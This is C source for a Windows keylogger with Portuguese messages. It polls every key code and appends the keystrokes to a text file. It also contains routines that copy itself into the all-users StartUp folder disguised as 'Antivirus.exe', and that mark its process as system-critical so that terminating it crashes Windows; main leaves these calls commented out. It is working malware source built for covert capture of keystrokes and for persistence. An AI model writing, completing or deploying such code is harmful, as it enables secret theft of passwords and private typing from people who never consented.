#if defined (unix)
	#error O sistema operacional deve ser Windows
#endif

#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <locale.h>
#include <time.h>
#include <string.h>
#include "include/sendmail.h"

void KeyLogger();
void MoveProgram();
char* ConvertToChar(int codAscii);
BOOL ProtectProcess();
BOOL EnablePriv (const char *szPriv);

int main(int argc, char* argv[])
{
	// ShowWindow(GetForegroundWindow(), SW_HIDE);
	// MoveProgram();	
	// ProtectProcess();
	
	while(TRUE) {
		KeyLogger();
		Sleep(1);
	}
	system("pause");
	return 0;
}

void KeyLogger()
{	
	FILE *file = NULL;
	file = fopen("C:\\Users\\Marlon Santos\\Desktop\\teclas.txt", "a");

	for(int keyCode=0; keyCode <= 255; keyCode++)
	{
		int keyState = GetAsyncKeyState(keyCode);

		if(keyState == -32767) {			
			char* tec = ConvertToChar(keyCode);
			if(tec != ""){
				fprintf(file, "%s", tec);
				printf("%s", tec);
			}else if(tec == ""){
				// fprintf(file,"%c", keyCode);
				// printf("%c", keyCode);
				// printf("%i", keyCode);
			}
		}
	}
	fclose(file);
}

void MoveProgram()
{	
	FILE *fp;

	char pathToFile[MAX_PATH];
	HMODULE getMod = GetModuleHandle (NULL);
	GetModuleFileName (getMod, pathToFile, sizeof(pathToFile));

	char* AllUsersProfile = getenv("allusersprofile");
	char destino[9999];
	strcpy(destino, AllUsersProfile);
	strcat(destino,"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Antivirus.exe");
	fp = fopen(destino, "r");

	if(!fp){
		CopyFile(pathToFile, destino, 0);
	}
	fclose(fp);
}

char* ConvertToChar(int codAscii)
{
	char* tecla;

	switch(codAscii){
		case 16: tecla = ""; break; // Shift
		case 17: tecla = "[CONTROL]"; break;
		case 18: tecla = "[ALT]"; break;
		case 32: tecla = "[SPACE]"; break;
		case 187: tecla = "="; break;
		case 188: tecla = ","; break;
		case 189: tecla = "-"; break;
		case 190: tecla = "."; break;
		case 191: tecla = ";"; break;
		case 193: tecla = "/"; break;
		case 192: tecla = "'"; break;
		case 127: tecla = "[DEL]"; break;
		case 220: tecla = "]"; break;
		case 221: tecla = "["; break;
		default: tecla = ""; break;
	}
	return tecla;
}
 
BOOL ProtectProcess() 
{
	typedef long ( WINAPI *RtlSetProcessIsCritical ) (
        IN BOOLEAN    bNew, 
        OUT BOOLEAN    *pbOld, 
        IN BOOLEAN    bNeedScb );

	if (EnablePriv(SE_DEBUG_NAME) != TRUE){
		printf("Erro em EnablePriv\n"); return FALSE;
	}

    
    HANDLE DLL = LoadLibrary("ntdll.dll");
    if(DLL == NULL){
		printf("Erro na DLL\n");
		return FALSE;
	}

	RtlSetProcessIsCritical setCritical;
	setCritical = (RtlSetProcessIsCritical) GetProcAddress((HINSTANCE) DLL, "RtlSetProcessIsCritical");
	
	if (!setCritical)
		return FALSE;
	setCritical(TRUE, NULL, FALSE);

	// SetCriticalProcess(FALSE, NULL, FALSE);
	return TRUE;
}
 
BOOL EnablePriv (const char *szPriv)
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES privs;
    memset (&privs, 0, sizeof (privs));

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) 
        return FALSE;

    if (!LookupPrivilegeValue(NULL, szPriv, &luid)){
        CloseHandle (hToken); return FALSE;
    }

    privs.PrivilegeCount = 1;
    privs.Privileges[0].Luid = luid;
    privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges (hToken, FALSE, &privs, sizeof(privs), NULL, NULL);
    CloseHandle (hToken);
    return bRet;
}

//MessageBox(	NULL, "Could not obtain function from ntdll!", "Error", MB_ICONEXCLAMATION | MB_OK);